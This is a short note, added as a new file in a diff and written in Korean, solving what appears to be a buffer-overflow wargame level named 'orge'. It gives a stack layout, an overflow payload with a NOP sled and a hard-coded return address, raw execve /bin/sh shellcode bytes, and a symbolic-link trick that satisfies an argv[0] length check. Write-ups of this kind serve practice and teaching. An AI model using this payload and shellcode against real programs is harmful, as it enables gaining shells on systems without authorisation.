@@ -1,0 +1,10 @@
+buffer[40] + ebp[4] + RET[4] + argc[4] + **argv[4]
+"\x90"*40 + "AAAA" + "\x5c\xfb\xff\xbf" + ... + "\x90"*1000 + [쉘코드]
+
+쉘:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+심볼릭 링크:
+ln -s orge `perl -e 'print "A"x75'`
+
+# "A"가 75개인 이유는 argv[0]로 값이 들어갈 때, 맨 앞에 "./"가 붙기 때문
